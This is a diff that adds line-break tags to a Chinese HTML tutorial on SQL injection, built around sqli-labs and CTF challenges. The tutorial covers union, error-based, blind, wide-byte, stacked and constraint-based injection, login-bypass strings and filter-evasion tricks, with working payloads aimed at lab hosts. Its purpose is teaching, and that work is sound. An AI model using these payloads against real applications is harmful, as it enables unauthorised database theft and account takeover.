@@ -8450,19 +8450,19 @@
 
 <h2 id="sql">SQL注入</h2>
 <h2 id="_1">环境相关</h2>
-<p>phpstudy：
+<p>phpstudy：<br />
 <a href="https://www.xp.cn">https://www.xp.cn</a></p>
-<p>sqli-labs：
+<p>sqli-labs：<br />
 <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
-<p>sublime：
+<p>sublime：<br />
 <a href="https://www.sublimetext.com/">https://www.sublimetext.com/</a></p>
-<p>具体搭建方式可以参考网上的教程
+<p>具体搭建方式可以参考网上的教程<br />
 这里提供看雪论坛的一个在线sqli-labs：<a href="http://43.247.91.228:84/">http://43.247.91.228:84/</a></p>
 <h2 id="_2">数据库基础</h2>
-<p>数据在数据库中是按照表单的方式存储的，在phpstudy里面，可以很方便的打开mysql终端
+<p>数据在数据库中是按照表单的方式存储的，在phpstudy里面，可以很方便的打开mysql终端<br />
 （打开后输入默认密码root）</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573461842773-c072384e-87c2-4b75-bfc6-8247ac3ea217-491135.png" /></p>
-<p>使用 <code>show databases;</code> 命令可以查看所有的数据库名
+<p>使用 <code>show databases;</code> 命令可以查看所有的数据库名<br />
 我的存在数据库：information_schema，challenges，mysql，performance_schema，security，test，yichen</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573461099740-907a0ae6-9bb7-4a99-9973-2fb0937a448e-141321.png" /></p>
 <p>其中：<strong>information_schema</strong> 数据库是 MySQL 自带的，在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。数据库里面几张重要的表的状态我放在这，如果后面涉及这几张表不太明白可以回来看一下</p>
@@ -8472,29 +8472,29 @@
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573461593350-90cbee18-612b-4b6f-ac1a-e065bae4e209-206425.png" /></p>
 <p>使用 <code>select * from yichen;</code> 来查看数据表"yichen"中所有的数据信息</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573461958036-f609eaaa-922f-4eb2-a954-48f7d4eefe39-204188.png" /></p>
-<p>数据表：yichen中一共有三列数据，列名分别是：id，name，age
-如果想查看yichen表中writeup的年龄应该怎样那？
-有两种简单的方法：
-<code>select age from yichen where name='writeup';</code>
-<code>select age from yichen where id=2;</code>
+<p>数据表：yichen中一共有三列数据，列名分别是：id，name，age<br />
+如果想查看yichen表中writeup的年龄应该怎样那？<br />
+有两种简单的方法：<br />
+<code>select age from yichen where name='writeup';</code><br />
+<code>select age from yichen where id=2;</code><br />
 这里需要注意的是name字段属于字符串，所以需要用单引号引起来</p>
-<p>那其实当我们访问一个网页上的时候比如sqli-labs的第一关：
+<p>那其实当我们访问一个网页上的时候比如sqli-labs的第一关：<br />
 ?id=1实际上就是去数据库里面查询id=1的时候的 name 和 password列的值</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573462434520-3b672c43-8219-48a4-bef9-095410f4a486-290641.png" /></p>
 <p>补充一些关于information_schema数据库的数据表的信息：</p>
-<p><strong>SCHEMATA 表：</strong>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））
+<p><strong>SCHEMATA 表：</strong>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474150129-3f2bd79e-a202-4e8e-b856-0aafde35fa82-342547.png" /></p>
-<p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）(有点乱...)
+<p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）(有点乱...)<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573472943149-8b1d46ce-6403-48f5-8ac8-f213e5ffc4b5-089855.png" /></p>
-<p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）
+<p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474346090-85d104c4-c093-464b-8af4-5ef3b1c300c3-688676.png" /></p>
-<p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））
+<p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474209881-b5b2a5cf-5a19-420b-ad6f-fbb690f1ff67-872736.png" /></p>
 <h2 id="sql_1">sql注入原理</h2>
-<p>前面提到访问?id=1的时候就是去数据库里查询id=1的字段的值，那么，当我不去正常访问id=1而是访问一个id=1'会发生什么？报错了！
+<p>前面提到访问?id=1的时候就是去数据库里查询id=1的字段的值，那么，当我不去正常访问id=1而是访问一个id=1'会发生什么？报错了！<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573463020241-ea253b3e-aecf-4e98-b0b8-0be5199c9291-508172.png" /></p>
-<p>看报错的回显发现
-您的SQL语法有误； 检查与您的MySQL服务器版本相对应的手册以获取正确的语法，以在第1行的''1'' LIMIT 0,1'附近使用
+<p>看报错的回显发现<br />
+您的SQL语法有误； 检查与您的MySQL服务器版本相对应的手册以获取正确的语法，以在第1行的''1'' LIMIT 0,1'附近使用<br />
 仔细看一下，''1'' LIMIT 0,1'，会发现单引号是这么配对的<img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573463731758-49360687-a0f8-4af2-97c5-12069ba95d80-410480.png" /></p>
 <p>也就是说我们输入的 1' 去查询的时候出问题了，我们可以查看一下less-1的源代码，找到查询语句</p>
 <pre><code class="language-php">&lt;?php
@@ -8523,46 +8523,46 @@ $row = mysql_fetch_array($result);//把结果变成了数组的形式
 
 ?&gt;
 </code></pre>
-<p>我们只要关心这一句
+<p>我们只要关心这一句<br />
 <code>SELECT * FROM users WHERE id='$id' LIMIT 0,1</code></p>
-<p>把之前传入的 <code>1'</code> 带入 <code>$id</code> 看看结果
+<p>把之前传入的 <code>1'</code> 带入 <code>$id</code> 看看结果<br />
 <code>SELECT * FROM users WHERE id='1'' LIMIT 0,1</code></p>
 <p>会发现传入的单引号把原本已经存在的那一个左单引号闭合掉了，那多出来的那一个右单引号就出了问题了</p>
-<p>使用 and 1=1--+
-mysql中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code>
+<p>使用 and 1=1--+<br />
+mysql中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code><br />
 <a href="https://blog.csdn.net/xiayun1995/article/details/86500605">sql注入中的注释符的解释</a></p>
-<p><code>'order by 4--+</code> 得到列数
+<p><code>'order by 4--+</code> 得到列数<br />
 order by 是用来排序的，后面可以跟着列数，比如 order by 1 是按照第一列来排序，当使用大于数据表有的列数的时候就肯定会报错了，这样就可以用来判断有几列</p>
 <p><code>-1'union select 1,2,3--+</code> 联合查询，一般用来检查什么地方可以回显</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573472008439-91aa61d7-2a5e-4929-afb0-64fe8df559bd-092233.png" /></p>
 <p>显示出 2,3，说明这里 2 与 3 的位置会被打印出来，我们就可以把想要查询的放在这里两个位置让他显示给我们</p>
-<p>这里介绍几个字符连接函数：
-1. concat(str1,str2,...)——没有分隔符地连接字符串
-2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
-3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据
+<p>这里介绍几个字符连接函数：<br />
+1. concat(str1,str2,...)——没有分隔符地连接字符串<br />
+2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串<br />
+3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据<br />
 因为我们查询到的数据不是只有一个，所以需要用连接函数把他们连接成一串才能显示出来</p>
 <p><code>union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>
-<p>这句话把查询到的 <code>schema_name（数据库名）</code> 连成了一串字符串在 name 的地方显示出来
+<p>这句话把查询到的 <code>schema_name（数据库名）</code> 连成了一串字符串在 name 的地方显示出来<br />
 从 information_schema 中的 schemata 这个表里面查询的，中间用 <code>.</code> 连接起来，所以上面那一条语句查询了所有数据库名并显示在 name（2） 的地方</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474481281-18fecc49-5917-4e34-a730-d5b0054557ab-089934.png" /></p>
 <p>那接下来只要替换 2 处的查询内容与后面的 from 的表就可以查询出所有的表名与列名了</p>
-<p>查询所有表名：
+<p>查询所有表名：<br />
 <code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</code></p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474896594-dfc43372-dd3b-47a8-9037-f0460bef89c1-386413.png" /></p>
-<p>查询所有列名：
+<p>查询所有列名：<br />
 <code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</code></p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573474926265-8d50bcaf-9796-405d-bed7-639c0849b1dd-088195.png" /></p>
-<p>那么已经知道所有的表名跟列名了，怎么去查询表中的数据呐？
+<p>那么已经知道所有的表名跟列名了，怎么去查询表中的数据呐？<br />
 <code>union select 1,username,password from users where id=6--+</code></p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573476264699-97a5fce4-fbb6-4551-8126-0ceb79276812-971819.png" /></p>
-<p>自己根据源代码尝试做一下前四关，语句基本一样，只要改一个地方就可以
-源代码在解压出来的文件夹中的Less开头的里面的index.php
+<p>自己根据源代码尝试做一下前四关，语句基本一样，只要改一个地方就可以<br />
+源代码在解压出来的文件夹中的Less开头的里面的index.php<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573476353408-77d91a36-00ca-415c-9dce-2140ab497eed-689637.png" /></p>
-<p>hint：只需要注意这个地方就可以了
+<p>hint：只需要注意这个地方就可以了<br />
 <img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1573476448206-c9771d69-5745-4a2e-9697-dc7a7c661f05-942103.png" /></p>
 <h2 id="_3">报错注入</h2>
 <h3 id="_4">相关函数</h3>
-<p>rand()产生0-1之间的随机数
+<p>rand()产生0-1之间的随机数<br />
 floor()向下取整</p>
 <h3 id="_5">原理讲解</h3>
 <p>假设有一个users表</p>
@@ -8597,10 +8597,10 @@ floor()向下取整</p>
 </tr>
 </tbody>
 </table>
-<p>进行如下查询：
+<p>进行如下查询：<br />
 select count(<em>),(concat(floor(rand(0)</em>2),'@',(select version())))x from users group by x</p>
 <p>floor(rand(0)*2)产生的结果为固定的011011</p>
-<p>进行group by时会产生一个新的虚拟表，group by时他后面的语句会运算两次，（对比，插入）
+<p>进行group by时会产生一个新的虚拟表，group by时他后面的语句会运算两次，（对比，插入）<br />
 刚开始虚拟表是空的：</p>
 <table>
 <thead>
@@ -8649,15 +8649,15 @@ select count(<em>),(concat(floor(rand(0)</em>2),'@',(select version())))x from u
 <p>扫描第三项时floor(rand(0)<em>2)得到0，表中没有，需要插入，但是插入的时候进行了第二次运算，floor(rand(0)</em>2)成了1</p>
 <p>但是虚拟表中已经有了1@5.7.19，x作为主键，是不允许存在相同的，所以就报错了</p>
 <h3 id="_6">其他函数介绍</h3>
-<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))
+<p>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br />
 mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
-<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br />
 mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
 <p>上面两个需要传入xpath格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
-<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br />
 mysql 重复特性，此处重复了 version，所以报错，有些地方不管用</p>
-<p>如果等号“=”被禁用了，可以使用like或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，
-如：
+<p>如果等号“=”被禁用了，可以使用like或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，<br />
+如：<br />
 <code>select 1,group_concat(tablem_name) where !(table_schema &lt;&gt; security)</code></p>
 <h3 id="_7">例题</h3>
 <p>实验吧题目：<a href="">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
@@ -8669,55 +8669,55 @@ mysql 重复特性，此处重复了 version，所以报错，有些地方不管
 </blockquote>
 <h2 id="_8">基于时间盲注</h2>
 <h3 id="if">if语句</h3>
-<p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))
-if 判断语句，第一个参数（判断语句）为假，返回第三个参数 sleep(5)，第一个参数为真，返回第二个参数 0
+<p>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))<br />
+if 判断语句，第一个参数（判断语句）为假，返回第三个参数 sleep(5)，第一个参数为真，返回第二个参数 0<br />
 sleep语句会等规定的秒数</p>
-<p>(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false))
-benchmark(count,expr)用来执行expr表达式count次数，执行一个函数若干次就会延长时间，这样就可以用来代替sleep函数
+<p>(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false))<br />
+benchmark(count,expr)用来执行expr表达式count次数，执行一个函数若干次就会延长时间，这样就可以用来代替sleep函数<br />
 这种方法有个听着贼牛逼的名字：<strong>侧信道攻击</strong></p>
 <h3 id="_9">截取函数</h3>
-<p>substr(string,start,length)       查看string从第start开始的length位
-substr(DATABASE(),1,1)&gt;'a'     数据库名第一位
+<p>substr(string,start,length)       查看string从第start开始的length位<br />
+substr(DATABASE(),1,1)&gt;'a'     数据库名第一位<br />
 substr(DATABASE(),1,2)&gt;'ad'    数据库名前两位</p>
-<p>substring(str,start,len)    等价于  substring(str from start for len)  这样就可以不用逗号进行查询
+<p>substring(str,start,len)    等价于  substring(str from start for len)  这样就可以不用逗号进行查询<br />
 防止逗号被过滤掉</p>
-<p>substring_index(str,delim,count)      被截取的字段，关键字，关键字出现的次数
+<p>substring_index(str,delim,count)      被截取的字段，关键字，关键字出现的次数<br />
 比如substring_index('aaabbbccc','b',2)     b出现第二次之前的东西</p>
-<p>select case when条件
-select case when username='admin' then 'aaa' else(sleep(3)) end from user
+<p>select case when条件<br />
+select case when username='admin' then 'aaa' else(sleep(3)) end from user<br />
 在if判断中的逗号被过滤，用这个代替</p>
 <h3 id="_10">例题</h3>
-<p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a>
+<p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a><br />
 (题目环境崩了)</p>
 <h2 id="bool">bool型盲注</h2>
 <h3 id="_11">相关函数</h3>
-<p>mid(str,start,len)
-left(str,len)
+<p>mid(str,start,len)<br />
+left(str,len)<br />
 right(str,len)</p>
 <h3 id="_12">例题</h3>
 <p>106.12.37.37:8080</p>
 <h2 id="_13">宽字节注入</h2>
 <h3 id="url">常见几个url转码</h3>
 <blockquote>
-<p><strong>空格       %20</strong>
-<strong>'             %27</strong>
-<strong>#            %23</strong>
-<strong>/            %5C</strong>
-<strong>%09       TAB 键（水平）</strong>
-<strong>%0a       新建一行</strong>
-<strong>%0b       TAB 键（垂直）</strong>
-<strong>%0c       新的一页</strong>
-<strong>%0d       return 功能</strong>
-**%a0       空格
+<p><strong>空格       %20</strong><br />
+<strong>'             %27</strong><br />
+<strong>#            %23</strong><br />
+<strong>/            %5C</strong><br />
+<strong>%09       TAB 键（水平）</strong><br />
+<strong>%0a       新建一行</strong><br />
+<strong>%0b       TAB 键（垂直）</strong><br />
+<strong>%0c       新的一页</strong><br />
+<strong>%0d       return 功能</strong><br />
+**%a0       空格<br />
 **</p>
 </blockquote>
 <h3 id="phpaddslashes">php函数addslashes()</h3>
 <p>作用：使用反斜线引用字符串</p>
 <p>对以下生效生效：</p>
 <blockquote>
-<p><strong>单引号：'</strong>
-<strong>反斜线：/</strong>
-<strong>双引号："</strong>
+<p><strong>单引号：'</strong><br />
+<strong>反斜线：/</strong><br />
+<strong>双引号："</strong><br />
 <strong>空值：NULL</strong></p>
 </blockquote>
 <p>它会在这些之前加上反斜线，这样单引号就是字符串里面的一个，而没有单引号在代码中的作用</p>
@@ -8730,16 +8730,16 @@ right(str,len)</p>
 <h4 id="_15">原理</h4>
 <p>在url编码之后，如果%后面的两个字符的值（十六进制形式）超过了128（ascii码最大表示），会默认为GBK形式，而Mysql在进行编码是认为GBK形式两个字符才算一个汉字</p>
 <h4 id="_16">例子</h4>
-<p>单引号被反斜线转义：
-<code>' --&gt;  \' --&gt; %5C%27</code>
-当在单引号之前加上%aa时
-<code>%aa' --&gt; %aa\' --&gt; ``%aa%5C``%27</code>
+<p>单引号被反斜线转义：<br />
+<code>' --&gt;  \' --&gt; %5C%27</code><br />
+当在单引号之前加上%aa时<br />
+<code>%aa' --&gt; %aa\' --&gt; ``%aa%5C``%27</code><br />
 会认为%aa%5C是一对</p>
 <h4 id="_17">实战</h4>
-<p>教程里会用到一些简单的sql手工注入知识，sqli-labs靶场自己搭建一个环境，先做1-4应该就能明白他是在干啥
-链接：<a href="https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q">https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q</a>
+<p>教程里会用到一些简单的sql手工注入知识，sqli-labs靶场自己搭建一个环境，先做1-4应该就能明白他是在干啥<br />
+链接：<a href="https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q">https://pan.baidu.com/s/15yFzUt_wFFTqkckHvBAT8Q</a><br />
 提取码：a4oy</p>
-<p>南邮新平台：<a href="https://cgctf.nuptsast.com/challenges">https://cgctf.nuptsast.com/challenges</a>
+<p>南邮新平台：<a href="https://cgctf.nuptsast.com/challenges">https://cgctf.nuptsast.com/challenges</a><br />
 对应题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
 <blockquote>
 <p>爆库：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa' union select 1,group_concat(schema_name) from information_schema.schemata --+</p>
@@ -8749,13 +8749,13 @@ right(str,len)</p>
 </blockquote>
 <h2 id="sql_2">基于约束的SQL攻击</h2>
 <h3 id="_18">原理</h3>
-<p>在MySQL进行数据插入的时候会把空格忽略掉，而且超过30（也可能是别的数）个以后的也会舍弃
-如果数据库中存在：
-<code>username：admin</code>
-<code>password：password</code>
-再插入：
-<code>username：admin  空格*30  1</code>
-<code>password：666</code>
+<p>在MySQL进行数据插入的时候会把空格忽略掉，而且超过30（也可能是别的数）个以后的也会舍弃<br />
+如果数据库中存在：<br />
+<code>username：admin</code><br />
+<code>password：password</code><br />
+再插入：<br />
+<code>username：admin  空格*30  1</code><br />
+<code>password：666</code><br />
 这样数据库里就会有以下数据：</p>
 <table>
 <thead>
@@ -8775,102 +8775,102 @@ right(str,len)</p>
 </tr>
 </tbody>
 </table>
-<p>虽然插入的时候用户名为 username：admin  空格*30  1 
-但是MySQL进行检索的时候会认为时admin（忽略空格，忽略30字以后的）
+<p>虽然插入的时候用户名为 username：admin  空格*30  1 <br />
+但是MySQL进行检索的时候会认为时admin（忽略空格，忽略30字以后的）<br />
 这样就意味着可以自定义一个admin的密码进行登录</p>
 <h3 id="_19">实战</h3>
 <p>bugku题目：<a href="https://ctf.bugku.com/challenges#login1(SKCTF)">https://ctf.bugku.com/challenges#login1(SKCTF)</a></p>
 <h2 id="order_by">order_by注入</h2>
 <h3 id="order_by_1">order_by语法格式</h3>
-<p>order_by {column_name[ASC|DESC]}[,n]
-默认按照升序进行排序，在不知道列名的情况下可以通过列的序号代替相应的列
+<p>order_by {column_name[ASC|DESC]}[,n]<br />
+默认按照升序进行排序，在不知道列名的情况下可以通过列的序号代替相应的列<br />
 注意：order_by不能运算，如order_by 1+1 与 order_by 2 是不一样的</p>
 <h3 id="_20">例题</h3>
 <p><a href="http://chall.tasteless.eu/level1/index.php?dir=ASC">http://chall.tasteless.eu/level1/index.php?dir=ASC</a></p>
 <h2 id="insert">insert注入</h2>
 <h3 id="insert_1">insert：插入</h3>
-<p>报错语法：(报错就能把数据库带出来)也能插进去。
+<p>报错语法：(报错就能把数据库带出来)也能插进去。<br />
 insert into data1 (id,name,year) values ('','attacker' or updatexml(1,concat(0x7e,database()),0),10);</p>
 <h3 id="update">update:更新</h3>
-<p>报错语法：(报错就能把数据库带出来)
+<p>报错语法：(报错就能把数据库带出来)<br />
 update data1 set year=11 or updatexml(1,concat(0x7e,database()),0) where id =7;</p>
 <h3 id="delete">delete:删除</h3>
-<p>(报错就能把数据库带出来)
+<p>(报错就能把数据库带出来)<br />
 delete from data1 where id =7 or updatexml(1,concat(0x7e,database()),0);</p>
 <h3 id="_21">例题</h3>
 <p>http://chall.tasteless.eu/level15/index.php</p>
 <h2 id="desc">DESC注入</h2>
-<p>{describe|desc} tbl_name [col_name |wild]
+<p>{describe|desc} tbl_name [col_name |wild]<br />
 describe提供有关一个表的列信息。col_name可以是一个列名或是一个包含sql通配符字符 “%”和“_”的字符串。</p>
 <p>mysql中反引号：`` 用于保留字符</p>
 <h3 id="_22">例题：</h3>
-<p>web.jarvisoj.com:32794
+<p>web.jarvisoj.com:32794<br />
 提示：源码：http://web.jarvisoj.com:32794/index.php~</p>
 <blockquote>
-<p>爆库：
+<p>爆库：<br />
 http://web.jarvisoj.com:32794/index.php?table=test<code></code>union select database() limit 1 offset 1</p>
-<p>爆表：
+<p>爆表：<br />
 http://web.jarvisoj.com:32794/index.php?table=test<code></code>union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 1</p>
-<p>爆列：
+<p>爆列：<br />
 http://web.jarvisoj.com:32794/index.php?table=test<code></code>union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1 offset 1</p>
-<p>爆字段：
+<p>爆字段：<br />
 http://web.jarvisoj.com:32794/index.php?table=test<code></code>union select flagUwillNeverKnow from secret_flag limit 1 offset 1</p>
 </blockquote>
 <h2 id="_23">二次注入</h2>
-<p>二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。
-二次排序注入思路：
-1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。
-2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
-3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
-4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。
+<p>二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。<br />
+二次排序注入思路：<br />
+1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。<br />
+2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。<br />
+3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。<br />
+4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。<br />
 5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p>
 <h2 id="_24">堆叠注入</h2>
 <p>在SQL中，分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，会一起执行</p>
-<p>;show databases;
-;show tables;
+<p>;show databases;<br />
+;show tables;<br />
 ;show columns from table;</p>
 <h3 id="2019">2019强网杯：随便注</h3>
 <p><code>inject=1'; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code></p>
-<p><code>rename table</code>words<code>to</code>words1<code>;</code>   把查询的表明改成words1
-<code>rename table</code>1919810931114514<code>to</code>words<code>;</code> 把希望查询的表明改成words
+<p><code>rename table</code>words<code>to</code>words1<code>;</code>   把查询的表明改成words1<br />
+<code>rename table</code>1919810931114514<code>to</code>words<code>;</code> 把希望查询的表明改成words<br />
 <code>alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code>   把id 与 flag 值互换</p>
 <p>然后 <code>1'; or 1=1#</code> 查询的时候就可以查出来了</p>
 <h3 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h3>
-<p>过滤了上个题目能用的，有一种 handler 语句(要连起来用啊)
-;handler 表名 open;
-;handler 表名 read first;
+<p>过滤了上个题目能用的，有一种 handler 语句(要连起来用啊)<br />
+;handler 表名 open;<br />
+;handler 表名 read first;<br />
 ;handler 表名 read next;</p>
 <p>1';handler FlagHere open; handler FlagHere read first;--+</p>
 <p><img alt="image.png" src="../img/551828_uhehluucbwyl7pc3/1601257333499-1ecb887c-f4cb-440b-8bdb-684b32b6a924-928097.png" /></p>
 <h2 id="_25">万能密码：</h2>
 <p>常用：</p>
-<p>admin' #
-'+'
-'+'
-0
-Aaa'='
-原理：
-单引号闭合，井号注释
+<p>admin' #<br />
+'+'<br />
+'+'<br />
+0<br />
+Aaa'='<br />
+原理：<br />
+单引号闭合，井号注释<br />
 <strong>select * from admin where username='admin' #</strong>' and password =''</p>
-<p>Mysql里select 'aaaaa'+1 返回的是1，会把单引号里面的当成0
-<strong>select * from admin where username=''+'' and password =''+''</strong>
-<strong>select * from admin where username=0 and password =0
+<p>Mysql里select 'aaaaa'+1 返回的是1，会把单引号里面的当成0<br />
+<strong>select * from admin where username=''+'' and password =''+''</strong><br />
+<strong>select * from admin where username=0 and password =0<br />
 </strong>都可以爆出数据</p>
-<p>先username=Aaa为假，再与' '比较为真
+<p>先username=Aaa为假，再与' '比较为真<br />
 <strong>select * from admin where username='Aaa'='' and password ='Aaa'=''</strong></p>
 <p>sql注入相关文件:<a href="https://www.yuque.com/attachments/yuque/0/2019/txt/376509/1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt?_lake_card=%7B%22uid%22%3A%221563238369116-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Ftxt%2F376509%2F1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt%22%2C%22name%22%3A%22A1-SQL%E6%B3%A8%E5%85%A5.txt%22%2C%22size%22%3A4612%2C%22type%22%3A%22text%2Fplain%22%2C%22ext%22%3A%22txt%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22IuS9W%22%2C%22card%22%3A%22file%22%7D">A1-SQL注入.txt</a> </p>
 <p>各数据库注入相关:<a href="https://www.netsparker.com/">https://www.netsparker.com/</a></p>
 <h2 id="waf">注入waf绕过</h2>
 <h4 id="_26">绕过引号限制</h4>
-<p>-- hex 编码
-SELECT * FROM Users WHERE username = 0x61646D696E
--- char() 函数
+<p>-- hex 编码<br />
+SELECT * FROM Users WHERE username = 0x61646D696E<br />
+-- char() 函数<br />
 SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p>
 <h4 id="_27">绕过字符串黑名单</h4>
-<p>SELECT 'a' 'd' 'mi' 'n';
-SELECT CONCAT('a', 'd', 'm', 'i', 'n');
-SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
-SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
+<p>SELECT 'a' 'd' 'mi' 'n';<br />
+SELECT CONCAT('a', 'd', 'm', 'i', 'n');<br />
+SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');<br />
+SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');<br />
 使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code> 函数第一个参数表示用哪个字符间隔所查询的结果。</p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/hgohr1">https://www.yuque.com/hxfqg9/web/hgohr1</a></p>
